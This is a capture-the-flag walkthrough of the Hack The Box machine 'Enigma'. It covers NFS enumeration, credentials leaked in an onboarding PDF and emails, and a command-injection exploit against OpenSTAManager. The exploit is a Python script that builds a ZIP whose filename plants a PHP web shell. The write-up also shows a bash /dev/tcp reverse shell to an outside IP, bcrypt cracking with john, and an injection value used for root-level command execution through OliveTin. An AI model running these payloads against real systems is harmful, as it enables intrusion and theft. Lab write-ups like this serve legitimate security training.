# Enigma

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.26.174

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/enigma_tcp.htb $ip
# 22/tcp    open  ssh
# 80/tcp    open  http
# 110/tcp   open  pop3
# 111/tcp   open  rpcbind
# 143/tcp   open  imap
# 993/tcp   open  imaps
# 995/tcp   open  pop3s
# 2049/tcp  open  nfs
# 34523/tcp open  unknown
# 35475/tcp open  unknown
# 36055/tcp open  unknown
# 48949/tcp open  unknown


# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/enigma_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/enigma_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**The NFS looks interesting lets do some enum of it**&#x20;

{% code overflow="wrap" %}
```bash
nmap --script nfs* $ip -sV -p111,2049

# 111/tcp  open  rpcbind 2-4 (RPC #100000)
# | rpcinfo:
# |   program version    port/proto  service
# |   100003  3,4         2049/tcp   nfs
# |   100003  3,4         2049/tcp6  nfs
# |   100021  1,3,4      33655/tcp6  nlockmgr
# |   100021  1,3,4      35901/tcp   nlockmgr
# |   100021  1,3,4      58122/udp   nlockmgr
# |   100021  1,3,4      60028/udp6  nlockmgr
# |   100024  1          32919/tcp6  status
# |   100024  1          38499/tcp   status
# |   100024  1          43857/udp   status
# |   100024  1          45034/udp6  status
# |   100227  3           2049/tcp   nfs_acl
# |_  100227  3           2049/tcp6  nfs_acl
# 2049/tcp open  nfs     3-4 (RPC #100003)

showmount -e $ip
# Export list for 10.129.26.174:
# /srv/nfs/onboarding *
```
{% endcode %}

{% code overflow="wrap" %}
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.26.174:/srv/nfs/onboarding ./target-NFS/ -o nolock
ls ./target-NFS
# New_Employee_Access.pdf
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>

**Let's read the PDF**

{% code overflow="wrap" %}
```bash
pdftotext New_Employee_Access.pdf output.txt

# http://mail001.enigma.htb
# kevin
# Enigma2024!
```
{% endcode %}

<mark style="color:blue;">**Step 4**</mark>

we modify the hosts file&#x20;

{% code overflow="wrap" %}
```bash
echo "10.129.26.174 enigma.htb mail001.enigma.htb" | tee -a /etc/hosts
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Let's analyze the vhost we found**

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**This is a patched version fo the Roundcube Webmail but we still enumaret we can found anything interesting**

{% code overflow="wrap" %}
```html
 format. Multiple files can be compressed into zip archives.</p><input multiple name="_file[]" accept=".eml,.mbox,.msg,message/rfc822,text/*.zip,application/zip,application/x-zip" id="uploadformInput" type="file" class="form-control"><div class="hint">Maximum allowed file size is 2.0 MB  
```
{% endcode %}

**I found this file upload functionnality also but we still enumarete and boom we found password reuse on sarah and then we found another VHOST** [support\_001.enigma.htb](http://support_001.enigma.htb/)

{% code overflow="wrap" %}
```bash
Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp
```
{% endcode %}

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 6**</mark>

**We have this open-source project version 2.9.8 that its has multipe vulnerabilities but the interesting one is command injection however i prefer do it manually to have a better undestanding**&#x20;

{% hint style="info" %}
**OverView** [**CVE-2025-69212**](https://github.com/lukasz-rybak/CVE-2025-69212)

**A critical OS Command Injection vulnerability exists in the P7M (signed XML) file decoding functionality. An authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server.**
{% endhint %}

<mark style="color:blue;">**Step 7**</mark>&#x20;

**Let's exploit this**

{% code overflow="wrap" %}
```bash
# Step 1: Create Malicious ZIP
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
    
Step 2: Upload ZIP
```
{% endcode %}

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
http://support_001.enigma.htb/files/SHELL.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

**Let's take a rev shell  now**&#x20;

{% code overflow="wrap" %}
```bash
http://support_001.enigma.htb/files/SHELL.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.63%2F4444%200%3E%261%27

listener 4444
www-data@enigma:~/html/openstamanager/files$

```
{% endcode %}

<mark style="color:blue;">**Step 8**</mark>&#x20;

I did some credentiel hunting and i found the local creds for database&#x20;

{% code overflow="wrap" %}
```bash
cat /var/www/html/openstamanager/config.inc.php

$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';

mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SHOW TABLES;" | grep -i -E "user|account|login|anagrafica|staff|admin"
# zz_check_user
# zz_user_sedi
# zz_users

mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT * FROM zz_users\G"
# admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
# haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt enigma_hashes.txt
# haris:bestfriends
```
{% endcode %}

<mark style="color:blue;">**Step 9**</mark>&#x20;

**we logged in as haris then we try to elevate our privilige**

{% code overflow="wrap" %}
```bash
su - haris
/bin/bash -i
export TERM=xterm

ss -tulnp
# tcp   LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*


curl -s http://127.0.0.1:1337/ 2>/dev/null | head -20

		<title>OliveTin</title>
		
ps aux | grep -i olive
# root        1530  0.0  0.4 1238736 16412 ?       Ssl  20:53   0:00 /usr/local/bin/OliveTin
		
```
{% endcode %}

{% hint style="info" %}
**OliveTin** is designed to let users click buttons to run pre-approved commands. If we can find its config or API, we can make it execute arbitrary commands **as root**.
{% endhint %}

<mark style="color:blue;">**Step 9**</mark>

{% code overflow="wrap" %}
```bash
find / -name "config.yaml" -path "*OliveTin*" 2>/dev/null
# /etc/OliveTin/config.yaml
# /opt/OliveTin/OliveTin-linux-amd64/config.yaml

cat /etc/OliveTin/config.yaml | grep "authRequireGuestsToLogin"
# authRequireGuestsToLogin: false
```
{% endcode %}

This is **gold**. OliveTin runs as **root**, has **no authentication required, i start ligolo agent on this subnet to automaticcaly forward all ports 240.0.0.1/32**

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
in the backup database 
on db_pass : ' ; cat /root/root.txt ; '
```
{% endcode %}

